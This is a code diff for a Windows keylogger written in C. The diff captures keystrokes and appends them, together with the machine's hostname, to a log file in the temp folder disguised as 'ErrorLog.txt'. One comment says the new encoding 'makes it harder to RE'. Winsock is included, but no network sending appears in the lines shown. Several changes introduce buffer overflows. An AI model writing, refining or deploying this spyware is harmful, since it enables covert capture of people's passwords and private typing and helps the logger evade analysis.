@@ -37,11 +37,15 @@
   }
 // Windows - The main program
 #elif defined (_WIN32)
+
+  #define LOGFILE "%temp%\\ErrorLog.txt"
   #include <Windows.h>
+  #include <winsock.h>
   #pragma comment(lib, "User32.lib")
 
+
   // Global variables
-  char vk_string[20];
+  char vk_string[4];
   BOOL stand = FALSE;
   BOOL invalid = FALSE;
 
@@ -50,14 +54,15 @@
     stand = FALSE;
     invalid = FALSE;
     //A-Z only
-    if ( vk > 40 && vk < 90 || vk == 32){
+    if ( vk > 38 && vk < 91 || vk == 32){
       printf("[*] Key pressed %c with keycode %i\n", vk, vk);
       sprintf(vk_string, "%d", vk);
+
       stand = TRUE;
     }
     else if (vk == 13){
-      strncpy(vk_string, "[ENTER]", 7);
-      printf("[!] Key pressed %s with keycode %i\n", vk_string, vk);
+      sprintf(vk_string, "%d", vk);
+      printf("[!] Key pressed [ENTER] with keycode %i\n", vk);
     }
     else{
       printf("[*] Invalid keycode code: %i \n", vk);
@@ -67,7 +72,26 @@
 
   // Main windows function
   int main(){
-    printf("[*] Compiled on windows\n");
+    TCHAR logFile[MAX_PATH] = { 0 };
+  	ExpandEnvironmentStrings(LOGFILE, logFile, _countof(logFile));
+
+    char cName[MAX_COMPUTERNAME_LENGTH + 1]; //need to allocate space
+    DWORD len = 55;//needs DWORD
+    if(GetComputerName(cName, &len) != 0) {
+      char host[sizeof(cName)+10];
+      strcpy(host, "Hostname: ");
+      strcat(cName, "\n");
+      strcat(host, cName);
+      printf("[*] %s",host);
+
+      FILE *file = NULL;
+      fopen_s(&file, logFile, "a+");
+      fwrite(host, sizeof(host), 1, file);
+      fclose(file);
+    }
+    else {
+      printf("[-] Error: could not get hostname");
+    }
 
     int last_vKey = 0;
   	while (1){
@@ -84,30 +108,22 @@
   				last_vKey = vKey;
 
           // Open text file with create or append
-  				FILE *f = NULL;
-  				fopen_s(&f, "log.txt", "a+");
+          FILE *file = NULL;
+          fopen_s(&file, logFile, "a+");
 
-          // Run key process function - this should proably be improved.
+          // Process vkey
           process_vKey(vKey);
 
-          // Check if it is a valid virtual key code
-          if (invalid = TRUE){
-            // Check if it is a standard keycode (A-z)
-            if (stand = TRUE){
-              int key = atoi(vk_string);
-              sprintf_s(vk_string, sizeof(vk_string), "%c", key);
-              printf("[+] Key processed: %c\n", key);
-            }
-            // Print unique keys like the enter button.
-            else{
-              // ERROR HERE: VK STRING IS WRONG.
-              printf("[+] Key processed: %s\n", vk_string);
-            }
-            // Write to file
-    				fwrite(vk_string, 1, 1, f);
-          }
-          // Close file
-          fclose(f);
+          // Append newline to keycode and makes it harder to RE
+          char src[4];
+          char dest[4];
+          strcpy(src, vk_string);
+          strcpy(dest, "\n");
+          strcat(src, dest);
+
+          fwrite(src, sizeof(src), 1, file);
+          fclose(file);
+
   			}
   		}
   	}
